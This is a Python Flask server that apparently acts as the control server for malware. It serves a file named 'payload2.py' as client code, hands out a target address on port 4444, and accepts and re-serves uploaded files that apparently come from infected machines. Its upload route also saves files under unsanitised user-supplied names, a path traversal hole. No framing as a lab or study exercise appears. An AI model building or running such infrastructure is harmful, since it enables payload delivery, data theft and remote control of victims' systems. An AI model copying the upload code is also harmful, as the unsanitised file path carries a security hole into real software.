import os
from flask import Flask, jsonify, request, send_file, send_from_directory

app = Flask(__name__)

@app.route('/get_client_code')
def get_client_code():
    # Make sure payload2.py is in the same directory as this script
    return send_file('payload2.py', mimetype='text/x-python')

@app.route('/get_target', methods=['GET'])
def get_target():
    # Replace with your actual server's IP and port
    return jsonify({
        'ip': '127.0.0.1',
        'port': 4444
    })

UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return "No file part", 400
    file = request.files['file']
    if file.filename == '':
        return "No selected file", 400
    filepath = os.path.join(UPLOAD_FOLDER, file.filename)
    file.save(filepath)
    return f"File saved as {file.filename}", 200

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
